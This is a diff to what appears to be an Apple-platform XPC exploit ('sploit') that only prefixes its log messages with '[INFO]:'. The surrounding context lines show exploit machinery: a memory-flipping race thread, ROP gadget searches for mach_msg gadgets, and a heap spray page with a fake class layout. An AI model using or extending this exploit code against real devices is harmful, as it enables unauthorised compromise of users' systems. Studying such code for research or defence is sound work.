@@ -18,8 +18,6 @@
 
 #include "post_exploit.h"
 
-
-
 #import <dlfcn.h>
 
 
@@ -313,13 +311,13 @@ flipper_thread(
   // the replacement q3 should not contain null in the lower three bytes
   uint64_t replacement_q3 = 0x0000000022414141;
 
-  printf("original_q1:    0x%016llx\n", original_q1);
-  printf("replacement_q1: 0x%016llx\n", replacement_q1);
+  printf("[INFO]: original_q1:    0x%016llx\n", original_q1);
+  printf("[INFO]: replacement_q1: 0x%016llx\n", replacement_q1);
 
-  printf("original_q2:    0x%016llx\n", original_q2);
+  printf("[INFO]: original_q2:    0x%016llx\n", original_q2);
   
-  printf("original_q3:    0x%016llx\n", original_q3);
-  printf("replacement_q3: 0x%016llx\n", replacement_q3);
+  printf("[INFO]: original_q3:    0x%016llx\n", original_q3);
+  printf("[INFO]: replacement_q3: 0x%016llx\n", replacement_q3);
 
 
   /*
@@ -452,7 +450,7 @@ find_gadget_candidate(
   for (char* candidate = *alternatives; candidate != NULL; alternatives++) {
     void* found_at = memmem(haystack_start, haystack_size, candidate, gadget_length);
     if (found_at != NULL){
-      printf("found at: %llx\n", (uint64_t)found_at);
+      printf("[INFO]: found at: %llx\n", (uint64_t)found_at);
       return (uint64_t)found_at;
     }
   }
@@ -498,7 +496,7 @@ find_mach_msg_gadget()
     return 0;
   }
   uint64_t addr = (uint64_t)mach_msg_gadget;
-  printf("found mach_msg gadget: %llx\n", addr);
+  printf("[INFO]: found mach_msg gadget: %llx\n", addr);
   return addr;
 }
 
@@ -523,7 +521,7 @@ find_mach_msg_epilogue_gadget()
     return 0;
   }
   uint64_t addr = (uint64_t)mach_msg_epilogue_gadget;
-  printf("found mach_msg epilogue gadget: %llx\n", addr);
+  printf("[INFO]: found mach_msg epilogue gadget: %llx\n", addr);
   return addr;
 }
 
@@ -579,7 +577,7 @@ uint64_t build_spray_page() {
     return 0;
   }
 
-  printf("mapped fixed addr\n");
+  printf("[INFO]: mapped fixed addr\n");
   
   struct fake_class_layout {
     uint64_t pad_0;              // +0x0
@@ -834,7 +832,7 @@ static mach_port_t sploit() {
   // start the flipper thread
   pthread_t th;
   pthread_create(&th, NULL, flipper_thread, (void*)flipper);
-  printf("started flipper thread\n");
+  printf("[INFO]: started flipper thread\n");
 
   // now build the XPC message using that shm port as an OOL data
   oxpc_object_t xpc_msg_dict = oxpc_dictionary_alloc();
